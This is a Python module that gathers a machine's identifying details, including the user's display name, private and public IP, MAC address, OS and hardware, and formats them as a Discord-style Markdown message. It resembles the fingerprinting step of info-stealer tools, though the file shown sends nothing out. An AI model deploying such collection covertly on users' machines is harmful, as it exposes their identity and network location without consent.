import platform, ctypes
from re import findall
from psutil import virtual_memory
from socket import gethostname, gethostbyname
from uuid import getnode
from requests import get
from os import name as osname


def get_system_info():
    info = {
        "platform": "---",
        "platform-release": "---",
        "platform-version": "---",
        "architecture": "---",
        "hostname": "---",
        "display-name": "---",
        "ip-address": "---",
        "public-ip": "---",
        "mac-address": "---",
        "processor": "---",
        "ram": "---",
    }
    try:
        # Credit: https://stackoverflow.com/a/58420504
        info["platform"] = platform.system()
        info["platform-version"] = "v" + platform.version()
        info["architecture"] = platform.machine()
        info["hostname"] = gethostname()
        info["display-name"] = get_display_name()
        info["ip-address"] = gethostbyname(gethostname())
        info["public-ip"] = get("https://api.ipify.org").content.decode("utf8")
        info["mac-address"] = ":".join(findall("..", "%012x" % getnode()))
        info["processor"] = platform.processor()
        info["ram"] = str(round(virtual_memory().total / (1024.0 ** 3))) + " GB"
    except Exception:
        pass
    return f"**Display Name:** `{info['display-name']}`\n**Host Name:** `{info['hostname']}`\n**Public IP:** `{info['public-ip']}`\n**Private IP:** `{info['ip-address']}`\n**MAC Address:** `{info['mac-address']}`\n**Operating System:** `{info['platform']}`\n**OS Version:** `{info['platform-version']}`\n**Architecture:** `{info['architecture']}`\n**Processor:**  `{info['processor']}`\n**RAM:** `{info['ram']}`"


def get_display_name():
    if osname == "nt":
        try:
            # Credit: https://stackoverflow.com/a/55371769
            GetUserNameEx = ctypes.windll.secur32.GetUserNameExW
            NameDisplay = 3
            size = ctypes.pointer(ctypes.c_ulong(0))
            GetUserNameEx(NameDisplay, None, size)
            nameBuffer = ctypes.create_unicode_buffer(size.contents.value)
            GetUserNameEx(NameDisplay, nameBuffer, size)
            return nameBuffer.value
        except Exception:
            return "---"
    else:
        return "---"
